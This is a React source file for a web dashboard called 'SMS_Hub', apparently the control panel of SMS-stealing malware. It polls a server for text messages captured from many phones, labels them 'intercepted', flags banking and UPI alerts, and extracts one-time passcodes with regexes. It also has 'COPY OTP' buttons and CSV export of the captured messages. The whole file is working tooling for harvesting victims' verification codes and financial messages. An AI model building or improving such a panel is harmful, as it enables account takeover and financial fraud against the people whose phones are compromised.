import { useEffect, useState, useMemo } from "react";
import { Layout } from "@/components/layout";
import { useToast } from "@/hooks/use-toast";
import {
  MessageSquare,
  Search,
  Copy,
  ChevronDown,
  ArrowDownWideNarrow,
  Smartphone,
  Phone,
  KeyRound,
  CheckCircle2,
  Download,
  X,
  Send,
  Radio,
  RefreshCw,
} from "lucide-react";
import {
  classifySms,
  extractInfo,
  CATEGORY_META,
  formatSmsDate,
  type SmsCategory,
  type SmsInfo,
} from "@/lib/smsClassifier";
import { getSms, type SmsRow } from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import { Link } from "wouter";

interface SmsEntry {
  deviceId: string;
  deviceModel: string;
  devicePhone: string;
  pushKey: string;
  from: string;
  body: string;
  date: number;
  category: SmsCategory;
  isFinance: boolean;
  amount: string | null;
  otpCode: string | null;
  info: SmsInfo;
  dbLabel: string;
  numbers: string[];
}

const ALL_CATS: SmsCategory[] = [
  "BANK",
  "UPI",
  "SHOPPING",
  "OTP",
  "TRAVEL",
  "INVESTMENT",
  "OFFERS",
  "ALERTS",
  "OTHER",
];

type SortMode = "newest" | "oldest" | "sender" | "device";

function extractOtp(body: string): string | null {
  const isOtpMsg =
    /otp|code|verification|one time|v-code|pin\b|passcode|secret/i.test(body);
  if (!isOtpMsg) return null;

  const m1 = body.match(
    /(?:otp|code|pin|passcode|verification\s*code)[^\d\n\r]{1,15}(\d{4,8})\b/i
  );
  if (m1) return m1[1];

  const m2 = body.match(/\b(\d{4,8})\s+is\s+(?:your\s+)?(?:otp|code|pin)/i);
  if (m2) return m2[1];

  const m3 = body.match(/\b(\d{4,8})\b/);
  return m3 ? m3[1] : null;
}

const ITEMS_PER_PAGE = 30;

export function AllSms() {
  const { toast } = useToast();
  const [allSms, setAllSms] = useState<SmsEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [catFilter, setCatFilter] = useState<string>("all");
  const [selectedDevice, setSelectedDevice] = useState<string>("all");
  const [search, setSearch] = useState("");
  const [sortMode, setSortMode] = useState<SortMode>("newest");
  const [currentPage, setCurrentPage] = useState(1);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  const { data: smsData, isSyncing, refetch } = usePolling(getSms, 4000);

  useEffect(() => {
    if (!smsData) return;

    const parsed: SmsEntry[] = [];
    smsData.forEach((row: SmsRow) => {
      let d = 0;
      if (typeof row.date === "number") d = row.date;
      else if (typeof row.date === "string") {
        d = isNaN(Number(row.date)) ? new Date(row.date).getTime() || 0 : Number(row.date);
      }
      if (d > 0 && d < 1e12) d *= 1000;

      const cat = classifySms(row.from, row.body);
      const info = extractInfo(row.body);
      const otp = extractOtp(row.body);
      const isFin = cat === "BANK" || cat === "UPI" || cat === "INVESTMENT" || !!info.amount;

      parsed.push({
        deviceId: row.deviceId,
        deviceModel: row.model || "Unknown Device",
        devicePhone: row.phone || "",
        pushKey: row.id,
        from: row.from || "UNKNOWN",
        body: row.body || "",
        date: d,
        category: cat,
        isFinance: isFin,
        amount: info.amount,
        otpCode: otp,
        info,
        dbLabel: row.dbLabel || "",
        numbers: info.numbers,
      });
    });

    setAllSms(parsed);
    setLoading(false);
  }, [smsData]);

  const uniqueDevices = useMemo(() => {
    const map = new Map<string, { label: string; count: number }>();
    allSms.forEach((s) => {
      const existing = map.get(s.deviceId);
      if (existing) {
        existing.count += 1;
      } else {
        map.set(s.deviceId, {
          label: s.devicePhone ? `${s.deviceModel} (${s.devicePhone})` : s.deviceModel,
          count: 1,
        });
      }
    });
    return Array.from(map.entries()).map(([id, val]) => ({
      id,
      label: val.label,
      count: val.count,
    }));
  }, [allSms]);

  const catCounts = useMemo(() => {
    const c: Record<string, number> = { all: allSms.length, finance: 0, otp: 0 };
    ALL_CATS.forEach((cat) => (c[cat] = 0));
    allSms.forEach((s) => {
      if (c[s.category] !== undefined) c[s.category]++;
      if (s.isFinance) c.finance++;
      if (s.otpCode) c.otp++;
    });
    return c;
  }, [allSms]);

  const displayed = useMemo(() => {
    let list = allSms;

    if (selectedDevice !== "all") {
      list = list.filter((s) => s.deviceId === selectedDevice);
    }

    if (catFilter !== "all") {
      if (catFilter === "finance-only") {
        list = list.filter((s) => s.isFinance);
      } else if (catFilter === "otp-only") {
        list = list.filter((s) => !!s.otpCode);
      } else {
        list = list.filter((s) => s.category === catFilter);
      }
    }

    if (search) {
      const q = search.toLowerCase();
      list = list.filter(
        (s) =>
          s.body.toLowerCase().includes(q) ||
          s.from.toLowerCase().includes(q) ||
          s.deviceModel.toLowerCase().includes(q) ||
          s.devicePhone.includes(q) ||
          s.deviceId.toLowerCase().includes(q) ||
          (s.otpCode && s.otpCode.includes(q))
      );
    }

    switch (sortMode) {
      case "newest":
        list = [...list].sort((a, b) => b.date - a.date);
        break;
      case "oldest":
        list = [...list].sort((a, b) => a.date - b.date);
        break;
      case "sender":
        list = [...list].sort((a, b) => a.from.localeCompare(b.from));
        break;
      case "device":
        list = [...list].sort((a, b) => a.deviceModel.localeCompare(b.deviceModel));
        break;
    }
    return list;
  }, [allSms, catFilter, selectedDevice, search, sortMode]);

  const totalPages = Math.max(1, Math.ceil(displayed.length / ITEMS_PER_PAGE));
  const paginatedDisplayed = displayed.slice(
    (currentPage - 1) * ITEMS_PER_PAGE,
    currentPage * ITEMS_PER_PAGE
  );

  useEffect(() => {
    setCurrentPage(1);
  }, [catFilter, selectedDevice, search, sortMode]);

  const copyText = (text: string, key: string, label: string = "COPIED") => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    toast({ title: label, description: text.slice(0, 40) });
    setTimeout(() => setCopiedKey(null), 1600);
  };

  const exportSmsCsv = () => {
    const esc = (v: any) => `"${String(v ?? "").replace(/"/g, '""')}"`;
    const header = ["Date", "From", "Category", "Amount", "OTP", "Device", "Body"];
    const rows = displayed.map((s) => [
      new Date(s.date).toISOString(),
      s.from,
      s.category,
      s.amount ?? "",
      s.otpCode ?? "",
      s.deviceModel,
      s.body,
    ].map(esc).join(","));

    const csvContent = [header.join(","), ...rows].join("\n");
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `sms-hub-${catFilter}-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <Layout>
      <div className="space-y-5">
        {/* Header Row */}
        <div className="flex flex-col sm:flex-row sm:items-end justify-between gap-4 pb-2 border-b border-border">
          <div>
            <div className="meta text-[10px] text-primary font-bold mb-1">
              INTERCEPTOR_STREAM / INBOX
            </div>
            <h2 className="font-display text-3xl sm:text-4xl text-foreground font-bold tracking-tight">
              SMS_Hub
            </h2>
            <p className="text-xs font-mono text-muted-foreground mt-1">
              TELEMETRY LOGS OF INTERCEPTED INCOMING AND OTP VERIFICATION MESSAGES
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={() => refetch()}
              disabled={isSyncing}
              className="action-btn"
              title="Refresh SMS stream"
            >
              <RefreshCw className={`w-3 h-3 ${isSyncing ? "animate-spin text-[#00FFCC]" : ""}`} />
              <span className="hidden sm:inline">{isSyncing ? "SYNCING..." : "RELOAD"}</span>
            </button>
            <button
              onClick={exportSmsCsv}
              className="action-btn"
              title="Export Filtered SMS to CSV"
            >
              <Download className="w-3.5 h-3.5" />
              EXPORT_CSV
            </button>
          </div>
        </div>

        {/* Stats bar */}
        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
          <div className="fleet-stat-card min-w-0">
            <h4 className="truncate">CAPTURED_SMS</h4>
            <div className="val text-foreground truncate">{allSms.length}</div>
          </div>
          <div className="fleet-stat-card min-w-0">
            <h4 className="truncate">FINANCE_ALERTS</h4>
            <div className="val text-[#FFB800] truncate">{catCounts.finance}</div>
          </div>
          <div className="fleet-stat-card min-w-0">
            <h4 className="truncate">OTP_CODES</h4>
            <div className="val text-[#00FFCC] truncate">{catCounts.otp}</div>
          </div>
          <div className="fleet-stat-card min-w-0">
            <h4 className="truncate">UNIQUE_SENDERS</h4>
            <div className="val text-primary truncate">{uniqueDevices.length}</div>
          </div>
        </div>

        {/* Filter & Search Bar */}
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5">
          {/* Search input */}
          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
            <input
              type="text"
              placeholder="SEARCH_BY_BODY_SENDER_OR_OTP..."
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="w-full bg-card/40 border border-border rounded px-3 py-2 pl-8 pr-8 text-xs font-mono text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-primary transition-all"
            />
            {search && (
              <button
                onClick={() => setSearch("")}
                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
              >
                <X className="w-3.5 h-3.5" />
              </button>
            )}
          </div>

          {/* Device Selector */}
          <div className="relative">
            <Smartphone className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
            <select
              value={selectedDevice}
              onChange={(e) => setSelectedDevice(e.target.value)}
              className="w-full bg-card/60 border border-border rounded px-3 py-2 pl-8 pr-8 text-xs font-mono text-foreground appearance-none focus:outline-none focus:border-primary"
            >
              <option value="all">DEVICE: ALL ({uniqueDevices.length})</option>
              {uniqueDevices.map((d) => (
                <option key={d.id} value={d.id}>
                  {d.label} — {d.count} SMS
                </option>
              ))}
            </select>
            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground pointer-events-none" />
          </div>

          {/* Sort selector */}
          <div className="relative sm:col-span-2 lg:col-span-1">
            <ArrowDownWideNarrow className="absolute left-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground" />
            <select
              value={sortMode}
              onChange={(e) => setSortMode(e.target.value as SortMode)}
              className="w-full bg-card/60 border border-border rounded px-3 py-2 pl-8 pr-8 text-xs font-mono text-foreground appearance-none focus:outline-none focus:border-primary"
            >
              <option value="newest">SORT: NEWEST FIRST</option>
              <option value="oldest">SORT: OLDEST FIRST</option>
              <option value="sender">SORT: SENDER A-Z</option>
              <option value="device">SORT: DEVICE A-Z</option>
            </select>
            <ChevronDown className="absolute right-3 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-muted-foreground pointer-events-none" />
          </div>
        </div>

        {/* Filter Quick Pills */}
        <div className="flex items-center gap-1.5 overflow-x-auto hide-scrollbar pb-1">
          <button
            onClick={() => setCatFilter("all")}
            className={`shrink-0 px-3 py-1 rounded text-[11px] font-mono font-semibold border transition-all ${
              catFilter === "all"
                ? "bg-primary text-primary-foreground border-primary shadow-[0_0_10px_rgba(0,119,255,0.4)]"
                : "border-border bg-card/40 text-muted-foreground hover:text-foreground hover:border-border/80"
            }`}
          >
            ALL ({catCounts.all})
          </button>

          <button
            onClick={() => setCatFilter(catFilter === "otp-only" ? "all" : "otp-only")}
            className={`shrink-0 px-3 py-1 rounded text-[11px] font-mono font-semibold border transition-all flex items-center gap-1.5 ${
              catFilter === "otp-only"
                ? "bg-primary text-primary-foreground border-primary shadow-[0_0_10px_rgba(0,119,255,0.4)]"
                : "border-border bg-card/40 text-[#00FFCC] hover:border-[#00FFCC]/40"
            }`}
          >
            <KeyRound className="w-3 h-3" />
            OTPS & CODES ({catCounts.otp})
          </button>

          <button
            onClick={() => setCatFilter(catFilter === "finance-only" ? "all" : "finance-only")}
            className={`shrink-0 px-3 py-1 rounded text-[11px] font-mono font-semibold border transition-all flex items-center gap-1.5 ${
              catFilter === "finance-only"
                ? "bg-[#FFB800] text-black border-[#FFB800] font-bold"
                : "border-border bg-card/40 text-[#FFB800] hover:border-[#FFB800]/40"
            }`}
          >
            BANK & FINANCE ({catCounts.finance})
          </button>

          {ALL_CATS.map((cat) => (
            <button
              key={cat}
              onClick={() => setCatFilter(catFilter === cat ? "all" : cat)}
              className={`shrink-0 px-2.5 py-1 rounded text-[10px] font-mono font-semibold border transition-all ${
                catFilter === cat
                  ? "bg-primary text-primary-foreground border-primary"
                  : "border-border bg-card/40 text-muted-foreground hover:text-foreground"
              }`}
            >
              {cat} ({catCounts[cat] || 0})
            </button>
          ))}
        </div>

        {/* ── Messages Feed ── */}
        {loading ? (
          <div className="space-y-2">
            {[1, 2, 3, 4, 5].map((i) => (
              <div key={i} className="h-24 rounded bg-card/40 border border-border animate-pulse" />
            ))}
          </div>
        ) : paginatedDisplayed.length === 0 ? (
          <div className="p-12 text-center border border-dashed border-border rounded bg-card/20 animate-in fade-in duration-300">
            <MessageSquare className="w-10 h-10 mx-auto mb-2 opacity-30 text-primary" />
            <p className="font-mono text-sm font-semibold text-foreground">
              NO_MESSAGES_MATCHING_FILTER
            </p>
            <p className="meta text-[10px] mt-1 text-muted-foreground">
              TRY ADJUSTING CATEGORY FILTERS OR SEARCH KEYWORD
            </p>
          </div>
        ) : (
          <div key={`${catFilter}-${selectedDevice}-${sortMode}`} className="space-y-2.5 animate-in slide-in-from-left-4 fade-in duration-300">
            {paginatedDisplayed.map((msg, idx) => {
              const msgKey = `sms-${msg.pushKey || idx}-${msg.deviceId}`;
              return (
                <div
                  key={msgKey}
                  className="stat-card p-3.5 hover:border-primary/50 transition-all flex flex-col gap-2"
                >
                  {/* Top Bar: Sender, Category Tag, Device Link, Time */}
                  <div className="flex items-center justify-between gap-2 flex-wrap text-xs">
                    <div className="flex items-center gap-2">
                      <span className="tag font-bold">{msg.from}</span>
                      <span className="meta text-[10px] text-muted-foreground">
                        [{msg.category}]
                      </span>
                      {msg.isFinance && (
                        <span className="rupee-alert text-[10px] font-bold">
                          FINANCIAL_ALERT
                        </span>
                      )}
                    </div>

                    <div className="flex items-center gap-3">
                      <Link
                        href={`/device/${msg.deviceId}`}
                        className="meta text-[10px] text-primary hover:underline flex items-center gap-1"
                      >
                        <Smartphone className="w-3 h-3" />
                        <span>{msg.deviceModel}</span>
                      </Link>
                      <span className="meta text-[10px] text-muted-foreground">
                        {formatSmsDate(msg.date)}
                      </span>
                    </div>
                  </div>

                  {/* Body Text */}
                  <div className="p-2.5 rounded bg-background/60 border border-border font-mono text-xs text-foreground leading-relaxed break-words select-text">
                    {msg.body}
                  </div>

                  {/* Bottom Meta & Quick Copy (Enhanced for Mobile) */}
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pt-1 border-t border-border/40 mt-1">
                    <div className="flex items-center gap-2 flex-wrap">
                      {msg.amount && (
                        <span className="rupee-alert text-[11px] font-bold py-1.5 px-2">
                          ₹ {msg.amount}
                        </span>
                      )}
                    </div>

                    <div className="flex items-center gap-2 w-full sm:w-auto">
                      {msg.otpCode && (
                        <button
                          onClick={() => copyText(msg.otpCode!, `otp-${idx}`, "OTP COPIED")}
                          className="flex-1 sm:flex-none action-btn min-h-[40px] sm:min-h-[auto] text-[11px] py-1.5 px-3 text-black bg-[#00FFCC] border-[#00FFCC] hover:bg-[#00FFCC]/90"
                        >
                          <KeyRound className="w-3.5 h-3.5" />
                          COPY OTP: {msg.otpCode}
                        </button>
                      )}
                      <button
                        onClick={() => copyText(msg.body, `body-${idx}`, "BODY COPIED")}
                        className="flex-1 sm:flex-none action-btn min-h-[40px] sm:min-h-[auto] text-[11px] py-1.5 px-3"
                      >
                        <Copy className="w-3.5 h-3.5" />
                        {copiedKey === `body-${idx}` ? "COPIED" : "COPY BODY"}
                      </button>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        )}

        {/* Pagination */}
        {totalPages > 1 && (
          <div className="flex items-center justify-between pt-4 border-t border-border">
            <span className="meta text-xs">
              PAGE {currentPage} OF {totalPages} ({displayed.length} TOTAL)
            </span>
            <div className="flex items-center gap-2">
              <button
                onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
                disabled={currentPage === 1}
                className="action-btn disabled:opacity-40"
              >
                PREVIOUS
              </button>
              <button
                onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
                disabled={currentPage === totalPages}
                className="action-btn disabled:opacity-40"
              >
                NEXT
              </button>
            </div>
          </div>
        )}
      </div>
    </Layout>
  );
}
